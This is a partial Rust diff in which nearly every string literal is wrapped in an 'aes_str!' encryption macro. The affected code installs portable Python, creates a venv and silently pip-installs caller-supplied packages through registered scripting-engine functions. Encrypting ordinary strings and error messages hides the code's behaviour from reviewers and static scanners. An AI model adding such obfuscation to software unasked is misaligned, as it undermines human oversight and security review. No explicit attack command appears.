+            &[aes_str!("install").as_str(), aes_str!("-y").as_str(), aes_str!("python3-venv").as_str()],
             Duration::from_secs(120),
         );
     }
     // Re-check.
     let (_, _, code) = run_cmd(
         Path::new(interpreter),
-        &["-m", "venv", "--help"],
+        &[aes_str!("-m").as_str(), aes_str!("venv").as_str(), aes_str!("--help").as_str()],
         Duration::from_secs(10),
     );
     if code == 0 { Ok(()) } else { Err(aes_str!("python3-venv not available and could not install it")) }
@@ -877,7 +878,7 @@ pub fn register_python_install(engine: &mut Engine) {
         // 4. Download python-build-standalone.
         match install_portable_python(install_dir) {
             Ok(p)  => p,
-            Err(e) => format!("Error: {}", e),
+            Err(e) => format!("{}{}", aes_str!("Error: "), e),
         }
     });
 
@@ -886,7 +887,7 @@ pub fn register_python_install(engine: &mut Engine) {
     engine.register_fn(&aes_str!("internal_python_install_portable"), |install_dir: &str| -> String {
         match install_portable_python(install_dir) {
             Ok(p)  => p,
-            Err(e) => format!("Error: {}", e),
+            Err(e) => format!("{}{}", aes_str!("Error: "), e),
         }
     });
 
@@ -895,7 +896,7 @@ pub fn register_python_install(engine: &mut Engine) {
     engine.register_fn(&aes_str!("internal_python_install_system"), || -> String {
         match try_package_managers() {
             Ok(p)  => p,
-            Err(e) => format!("Error: {}", e),
+            Err(e) => format!("{}{}", aes_str!("Error: "), e),
         }
     });
 
@@ -922,7 +923,7 @@ pub fn register_python_install(engine: &mut Engine) {
                 } else {
                     match install_portable_python(install_dir) {
                         Ok(p)  => p,
-                        Err(e) => return format!("Error installing Python: {}", e),
+                        Err(e) => return format!("{}{}", aes_str!("Error installing Python: "), e),
                     }
                 }
             }
@@ -930,24 +931,24 @@ pub fn register_python_install(engine: &mut Engine) {
 
         // 2. Ensure python3-venv module is available.
         if let Err(e) = ensure_venv_module(&interp) {
-            return format!("Error: {}", e);
+            return format!("{}{}", aes_str!("Error: "), e);
         }
 
         // 3. Create venv (idempotent - venv skips if already valid).
         let venv_bin = venv_python(venv_path);
         if !venv_bin.exists() {
             let (out, err, code) = run_cmd(
-                Path::new(&interp), &["-m", "venv", venv_path], Duration::from_secs(60),
+                Path::new(&interp), &[aes_str!("-m").as_str(), aes_str!("venv").as_str(), venv_path], Duration::from_secs(60),
             );
             if code != 0 {
-                return format!("Error creating venv: {} {}", out, err);
+                return format!("{}{} {}", aes_str!("Error creating venv: "), out, err);
             }
         }
 
         // 4. Upgrade pip silently.
         let pip = venv_pip(venv_path);
         let _ = run_cmd(
-            &pip, &["install", "--upgrade", "pip", "--quiet"], Duration::from_secs(120),
+            &pip, &[aes_str!("install").as_str(), aes_str!("--upgrade").as_str(), aes_str!("pip").as_str(), aes_str!("--quiet").as_str()], Duration::from_secs(120),
         );
 
         // 5. Install requested packages.
@@ -955,12 +956,12 @@ pub fn register_python_install(engine: &mut Engine) {
             let packages: Vec<String> =
                 serde_json::from_str(packages_json).unwrap_or_default();
             if !packages.is_empty() {
-                let mut args = vec!["install", "--quiet"];
-                let pkg_strs: Vec<&str> = packages.iter().map(String::as_str).collect();
-                args.extend_from_slice(&pkg_strs);
-                let (out, err, code) = run_cmd(&pip, &args, Duration::from_secs(300));
+                let mut args: Vec<String> = vec![aes_str!("install"), aes_str!("--quiet")];
+                args.extend(packages.iter().cloned());
+                let arg_refs: Vec<&str> = args.iter().map(|s| s.as_str()).collect();
+                let (out, err, code) = run_cmd(&pip, &arg_refs, Duration::from_secs(300));
                 if code != 0 {
-                    return format!("Venv created but pip install failed: {} {}", out, err);
+                    return format!("{}{} {}", aes_str!("Venv created but pip install failed: "), out, err);
                 }
             }
         }
@@ -975,7 +976,7 @@ pub fn register_python_install(engine: &mut Engine) {
     engine.register_fn(&aes_str!("internal_python_ensure_venv"), |interpreter: &str| -> String {
         match ensure_venv_module(interpreter) {
             Ok(_)  => aes_str!("venv module available"),
-            Err(e) => format!("Error: {}", e),
+            Err(e) => format!("{}{}", aes_str!("Error: "), e),
         }
     });
 
@@ -986,7 +987,7 @@ pub fn register_python_install(engine: &mut Engine) {
     engine.register_fn(&aes_str!("internal_python_pbs_url"), || -> String {
         match fetch_pbs_url() {
             Ok(url) => url,
-            Err(e)  => format!("Error: {}", e),
+            Err(e)  => format!("{}{}", aes_str!("Error: "), e),
         }
     });
 }
@@ -1091,7 +1092,7 @@ mod tests {
         require_python!();
         let interp = find_python().unwrap();
         let (out, err, code) = run_cmd(
-            Path::new(&interp), &["--version"], Duration::from_secs(10)
+            Path::new(&interp), &[aes_str!("--version").as_str()], Duration::from_secs(10)
         );
         assert_eq!(code, 0, "python --version should exit 0, stderr: {}", err);
         let combined = format!("{}{}", out, err);
@@ -1669,6 +1670,6 @@ while True:
         assert!(url.ends_with(".tar.gz"), "URL should be a tar.gz: {}", url);
         // The URL should match our platform suffix.
         let suffix = pbs_asset_suffix();
-        assert!(url.ends_with(suffix), "URL '{}' should end with '{}'", url, suffix);
+        assert!(url.ends_with(&suffix), "URL '{}' should end with '{}'", url, suffix);
     }
 }
